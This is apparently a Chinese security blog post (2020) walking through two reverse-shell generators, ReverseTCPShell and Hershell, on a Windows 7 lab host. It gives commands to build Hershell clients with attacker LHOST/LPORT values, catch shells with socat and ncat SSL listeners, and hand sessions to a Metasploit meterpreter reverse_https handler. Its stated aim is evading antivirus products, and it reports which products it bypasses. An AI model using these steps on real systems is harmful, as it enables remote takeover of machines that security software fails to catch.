---
title: "ReverseTCPShell C2&amp;&amp;Hershell-两个反向shell生成器"
categories: [ "安全技术","工具分享" ]
tags: [ "webshell","免杀" ]
draft: false
slug: "481"
date: "2020-02-04 17:05:00"
---

## 事情起因

使用的是前面文章`nps_payload`的三件套环境，配置如下：

- Win7 SP1 build 7601
- windows 防火墙打开
- 360 杀毒正式版 5.0.0.8170
- 腾讯电脑管家 13.3.20238.213
- 火绒 5.0.36.16

## ReverseTCPShell C2

首先从[github 地址][1]下载`ReverseTCP.ps1`文件并使用`powershell`打开

设置`LHOST`和`LPORT`，会让你选择加密方式，默认有三种

- ASCII
- xor
- Base64

我这里选择了`xor`

![][2]

自动生成了`ps`和`cmd`下的利用代码，并且开始监听`LPORT`

![][3]

我们复制`cmd`代码到`win7`上，成功免杀三件套获得`shell`

![][4]

可以执行简单的命令`ls`,`whoami`,`upload`,`download`,`screenshot`

![][5]

虽然执行的命令少，但至少目前是三件套免杀的，可以获取到`shell`后上传免杀渗透工具继续渗透。

## Hershell

> Hershell 是一款 go 语言编写的多平台反向 shell 生成器，使用 tls 加密流量，并提供证书公钥指纹固定功能，防止流量拦截。

这个工具需要`go`环境，如果已经安装的可以跳过这部分

### go 环境

首先打开`go`环境下载的[中文官网][6]，获取最新`linux`版本的`go`下载链接：

```
wget https://studygolang.com/dl/golang/go1.13.7.linux-amd64.tar.gz
sudo tar -xzf go1.13.7.linux-amd64.tar.gz -C /usr/local/
export GOROOT=/usr/local/go
export GOBIN=$GOROOT/bin
export PATH=$PATH:$GOBIN
export GOPATH=$HOME/gopath (可选设置)
go version查看是否安装成功
```

### 使用

拉取：

```
go get github.com/lesnuages/hershell
```

首先生成一个证书：

```
cd hershell
make depends
```

![][7]

以 windows 为例，生成一个客户端，其他平台同理：

```
make windows64 LHOST=192.168.1.18 LPORT=3333
```

![][8]

得到的`hershell.exe`拷贝到目标主机上，**实测`360`杀毒能够查杀，火绒和腾讯没问题**

然后可以使用如下程序开始监听：

- socat
- ncat
- openssl server module
- metasploit multi handler（python/shell_reverse_tcp_ssl payload）

我个人推荐使用`socat`，命令如下：

```
socat openssl-listen:3333,reuseaddr,cert=server.pem,cafile=server.key system:bash,pty,stderr
```

但我运行一直报错：

![][9]

只能使用`ncat`了，这个`ncat`可不是那个`netcat`的`nc`

安装`nmap`即可使用，监听命令为：

```
ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 3333
```

![][10]

虚拟机上打开`hershell.exe`，`ubuntu`上即可接收到`shell`:

![][11]

### 与 msf 互传

支持 msf 以下的 payload：

- windows/meterpreter/reverse_tcp
- windows/x64/meterpreter/reverse_tcp
- windows/meterpreter/reverse_http
- windows/x64/meterpreter/reverse_http
- windows/meterpreter/reverse_https
- windows/x64/meterpreter/reverse_https

那这里就选择 64 位的带`ssl`的`windows/x64/meterpreter/reverse_https`吧

先把`hershell`生成的`server.pem`文件拷贝在`msf`所在主机上，然后`msf`开启监听：

```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
setg LHOST 192.168.1.2
setg LPORT 3333
set HandlerSSLCert /root/server.pem
exploit -j -z
```

这里的`ip`和端口都是`msf`所在主机上的，可以随便设置

![][12]

然后 hershell 进行同传：

```
[hershell]> meterpreter https 192.168.1.2:3333
```

![][13]

实测没有接收成功

参考文章：

- [RedTeam 之 ReverseTCPShell][14]
- [Hershell-----一款多平台反向 shell 生成器][15]

本文完。

[1]: https://github.com/ZHacker13/ReverseTCPShell
[2]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_170200.png
[3]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_170225.png
[4]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_170135.png
[5]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_170325.png
[6]: https://studygolang.com/dl
[7]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_173517.png
[8]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_202904.png
[9]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_210409.png
[10]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_210636.png
[11]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_210743.png
[12]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_211705.png
[13]: https://img.soapffz.com/archives_img/2020/02/04/archives_20200204_212544.png
[14]: https://mp.weixin.qq.com/s/JbgSdLTkZJA5LJ6kUWPzSg
[15]: https://mp.weixin.qq.com/s/xg2SBD_k-zEobkbvOvrfqA